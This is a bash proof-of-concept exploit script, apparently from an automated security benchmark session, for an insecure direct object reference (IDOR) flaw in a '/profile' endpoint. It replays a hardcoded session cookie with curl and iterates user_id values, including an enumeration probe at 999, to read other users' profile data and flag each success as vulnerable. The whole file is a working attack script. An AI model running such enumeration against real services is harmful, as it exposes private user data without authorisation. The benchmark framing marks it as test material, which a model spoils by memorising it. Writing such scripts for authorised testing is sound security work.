#!/bin/bash
# POC: Demonstrates IDOR vulnerability in GET /profile endpoint with enhanced debugging and verification of unauthorized read access to other users' profile data
# Target: ./repo
# Created: 2025-11-07T17:04:39.203Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# IDOR Vulnerability POC - Profile Retrieval (GET Request)
# Demonstrates unauthorized read access to other users' profile data via user_id parameter

TARGET_URL="${1:-http://localhost:5000}"
SESSION_COOKIE="${2:-eyJ1c2VyX2lkIjoxfQ.aQ4l0g.OxTuOwTc1H4L-9rmwFYE9Q-OOFE}"

echo "[*] IDOR POC - Profile Retrieval via GET Request"
echo "[*] Target: $TARGET_URL"
echo "[*] Using session cookie: ${SESSION_COOKIE:0:30}..."
echo ""

# Function to retrieve a user's profile with verbose output
get_profile() {
    local user_id=$1
    echo "[*] Attempting to retrieve profile for user_id=$user_id..."
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X GET \
        "$TARGET_URL/profile?user_id=$user_id" \
        -H "Cookie: session=$SESSION_COOKIE" \
        -H "Content-Type: application/json")
    
    http_status=$(echo "$response" | tail -1 | cut -d: -f2)
    body=$(echo "$response" | head -n -1)
    
    echo "[+] HTTP Status: $http_status"
    echo "[+] Response Body:"
    if [ -n "$body" ]; then
        echo "$body" | python3 -m json.tool 2>/dev/null || echo "$body"
    else
        echo "(Empty response)"
    fi
    
    if [ "$http_status" = "200" ] && [ -n "$body" ]; then
        echo "[!] VULNERABLE: Unauthorized access to user $user_id profile granted!"
        return 0
    fi
    echo ""
    return 1
}

vulnerability_found=0

# Test 1: Retrieve user 2's profile
echo "=== TEST 1: Retrieve User 2's Profile ==="
get_profile 2
if [ $? -eq 0 ]; then vulnerability_found=1; fi

# Test 2: Retrieve user 1's profile
echo "=== TEST 2: Retrieve User 1's Profile ==="
get_profile 1
if [ $? -eq 0 ]; then vulnerability_found=1; fi

# Test 3: Retrieve user 3's profile
echo "=== TEST 3: Retrieve User 3's Profile ==="
get_profile 3
if [ $? -eq 0 ]; then vulnerability_found=1; fi

# Test 4: Attempt to retrieve user 999's profile (enumerate beyond known users)
echo "=== TEST 4: Attempt to Retrieve User 999's Profile (Enumeration) ==="
get_profile 999

echo ""
if [ $vulnerability_found -eq 1 ]; then
    echo "[!] IDOR VULNERABILITY CONFIRMED - Unauthorized profile access possible"
    exit 0
else
    echo "[*] No vulnerable responses detected (server may not be running)"
    exit 0
fi